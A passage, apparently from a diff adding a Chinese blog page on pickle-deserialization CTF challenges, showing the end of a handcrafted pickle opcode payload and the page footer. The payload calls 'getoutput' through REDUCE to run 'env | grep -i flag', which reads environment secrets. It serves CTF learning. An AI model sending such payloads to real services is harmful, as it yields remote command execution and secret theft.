(长度<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;\x8c\tgetoutput&#x27;</span>   # SHORT_BINUNICODE <span class="string">&#x27;getoutput&#x27;</span> (长度<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;\x93&#x27;</span>              # STACK_GLOBAL</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;\x8c\x12env | grep -i flag&#x27;</span>  # 命令 (长度<span class="number">0x12</span>=<span class="number">18</span>)</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;\x85&#x27;</span>              # TUPLE1</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;R&#x27;</span>                 # REDUCE (执行函数)</span><br><span class="line"></span><br><span class="line">    b<span class="string">&#x27;.&#x27;</span>                 # STOP</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">写作</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BE%8E%E5%9B%A2CTF2022-easypickle"><span class="toc-number">1.</span> <span class="toc-text">美团CTF2022-easypickle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-jwt-pickle"><span class="toc-number">2.</span> <span class="toc-text">极客大挑战2024-jwt_pickle</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0X25%E9%A9%AC%E5%93%88%E9%B1%BC%E5%95%86%E5%BA%97"><span class="toc-number">3.</span> <span class="toc-text">0X25马哈鱼商店</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A%E5%90%8Ceasypickle"><span class="toc-number">3.1.</span> <span class="toc-text">解法1：同easypickle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">解法2：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%953%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">解法3：*</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lily2663.github.io/2026/04/06/PICKLE/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lily2663.github.io/2026/04/06/PICKLE/&text=几个pickle反序列化"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lily2663.github.io/2026/04/06/PICKLE/&is_video=false&description=几个pickle反序列化"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=几个pickle反序列化&body=Check out this article: https://lily2663.github.io/2026/04/06/PICKLE/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lily2663.github.io/2026/04/06/PICKLE/&title=几个pickle反序列化"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lily2663.github.io/2026/04/06/PICKLE/&name=几个pickle反序列化&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2026 Li1yZer0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="/">首页</a></li><li><a href="/about/">关于</a></li><li><a href="/archives/">写作</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+<div id="visitor-tracker">
+    <span class="status-text">[ STATUS: TRACKING_ACTIVE ]</span>
+    <a target="_blank" rel="noopener" href="https://info.flagcounter.com/NvkP">
+        <img src="https://s01.flagcounter.com/count2/NvkP/bg_1D1F21/txt_2BBC8A/border_1D1F21/columns_1/maxflags_5/viewers_0/labels_0/pageviews_1/flags_0/percent_0/" alt="Flag Counter" border="0">
+    </a>
+</div>
+
+<style>
+  /* 移除虚线，并将统计器固定在右下角 */
+  #visitor-tracker {
+    position: fixed;
+    right: 20px;
+    bottom: 20px;
+    text-align: right;
+    z-index: 100;
+    opacity: 0.6; /* 默认半透明，不抢戏 */
+    transition: opacity 0.3s ease;
+  }
+
+  #visitor-tracker:hover {
+    opacity: 1; /* 鼠标悬停时变亮 */
+  }
+
+  .status-text {
+    color: #2bbc8a;
+    font-family: monospace;
+    font-size: 10px;
+    display: block;
+    margin-bottom: 5px;
+    letter-spacing: 1px;
+  }
+
+  /* 适配移动端：防止遮挡右下角，手机上直接隐藏或改为静态 */
+  @media screen and (max-width: 480px) {
+    #visitor-tracker {
+      position: static;
+      text-align: center;
+      margin-top: 20px;
+    }
+  }
+</style>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.css">
+<script src="https://cdn.staticfile.org/aplayer/1.10.1/APlayer.min.js"></script>
+<script src="https://cdn.staticfile.org/meting/2.0.1/Meting.min.js"></script>
+
+<style>
+  /* 强制把播放器提到最上层，防止被挡住 */
+  .aplayer.aplayer-fixed {
+    z-index: 9999 !important; 
+    background: #1d1f21 !important;
+  }
+  .aplayer .aplayer-pic {
+    background-color: #2bbc8a !important;
+  }
+</style>
+
+<meting-js
+    server="netease" 
+    type="playlist" 
+    id="2672160214"
+    fixed="true" 
+    mini="true"
+    autoplay="false"
+    theme="#2bbc8a"
+    list-folded="true">
+</meting-js>
+
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+    $(function() {
+      var inputPath = "/search.xml";
+      if ($("#local-search-input").length > 0) {
+          searchFunc(inputPath, 'local-search-input', 'local-search-result');
+      }
+    });
+  </script>
+
+
+
+
+
